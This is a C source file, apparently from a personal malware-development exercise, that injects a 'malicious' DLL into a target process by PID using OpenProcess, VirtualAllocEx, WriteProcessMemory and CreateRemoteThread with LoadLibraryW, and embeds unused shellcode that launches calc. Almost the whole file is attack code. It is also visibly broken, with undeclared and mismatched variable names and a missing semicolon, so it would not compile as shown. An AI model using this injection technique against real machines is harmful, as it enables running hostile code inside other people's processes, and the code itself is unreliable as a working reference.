#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>

// Define macros to create status symbols
#define DEFINE_STATUS_SYMBOL(name, value) \
    const char* name = value;

// Use the macros to define status symbols
DEFINE_STATUS_SYMBOL(SUCC, "[+]")
DEFINE_STATUS_SYMBOL(ERR, "[-]")
DEFINE_STATUS_SYMBOL(INFO, "[*]")

int main(int argc, char* argv[]) {
    /* Shellcode to pop calc */
    unsigned char shellcode[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x00";
    size_t shellcode_size = sizeof(shellcode);

    /* Variable declaration */
    DWORD TID, PID = NULL;
    LPVOID rBuffer = NULL;
    HANDLE hProcess, hThread = NULL;
    HMODULE hMalicousDLL = NULL;
    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\thoma\\Documents\\MalwareDev\\0x03 - DLL Injection\\malicious_dll.dll";
    size_t pathSize = sizeof(dllPath);
    size_t bytesWritten = 0;

    /* Ger Process Handle */
    if (argc < 2) {
        printf("Usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    /* Parse user input */
    PID = atoi(argv[1]);
    printf("%sAttempting to get process handle.\n", INFO);
    hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);
    if (hProcess == NULL) {
        printf("%s Cannot get process handle.\n", ERR);
        return EXIT_FAILURE;
    }
    printf("%sSuccessfully got process handle.\n", SUCC);
    printf("\t-0x%p\n", hProcess);

    /* Get Handle to Kernel32 -> Use it's functions to load our exploit DLL */
    printf("%s Getting Kernel32.dll's handle.\n", INFO);
    hKernel32 = GetModuleHandleW(L"kernel32");
    if (hKernel32 == NULL) {
        printf("%s Error getting Kernel32's handle.\n", ERR);
        return EXIT_FAILURE;
    }
    printf("%s Got a handle to Kernel32.dll\n", SUCC);
    printf("\t-0x%p\n", hKernel32);

    /* Now use kernel32's LoadLibrary() function to load our malicious DLL */
    printf("%s Findng address of LoadLibrary().\n", INFO);
    LPTHREAD_START_ROUTINE maliciousLoadDLL = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, L"LoadLibraryW");
    printf("%s Found address of LoadLibrary() from Kernel32\n", SUCC);
    printf("\t-0x%p\n", maliciousLoadDLL);

    /* Setup our exploit */
    RemoteBuffer = VirtualAllocEx(
            ProcessHandle, 
            NULL, 
            DLLPathSize, 
            (MEM_COMMIT | MEM_RESERVE), 
            PAGE_READWRITE
            );
    if (NULL == RemoteBuffer) {
        printf("%s VirtualAlloc Failed, error:", ERR, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s Allocated a buffer with PAGE_READWRITE permissions.\n\t-0x%p\n", SUCC, RemoteBuffer);

    /* Write our malicious DLL into target process */
    WriteProcessMemory(
        ProcessHandle,
        RemoteBuffer,
        dllPath,
        DLLPathSize,
        &bytesWritten
    );
    printf("%s Successfully wrote bytes into allocated buffer\n", SUCC);
    
    ThreadHandle = CreateRemoteThread(
        ProcessHandle,
        NULL,
        0,
        p_LoadLibraryW,
        RemoteBuffer,
        0,
        0
    );
    if (NULL == ThreadHandle) {
        printf("%s Error getting thread handle\n", ERR);
        return EXIT_FAILURE;
    }
    printf("%s Successfully got thread handle\n", SUCC);

    /* Wait for thread to finish executing */
    WaitForSingleObject(ThreadHandle)

    CLEANUP:
        if (hThread) {
            printf("%s Closing Thread Handle\n", INFO);
            CloseHandle(hThread);
        }
        if (hProcess) {
            printf("%s Closing Process Handle\n", INFO);
            CloseHandle(hProcess);
        }
        return EXIT_SUCCESS;
}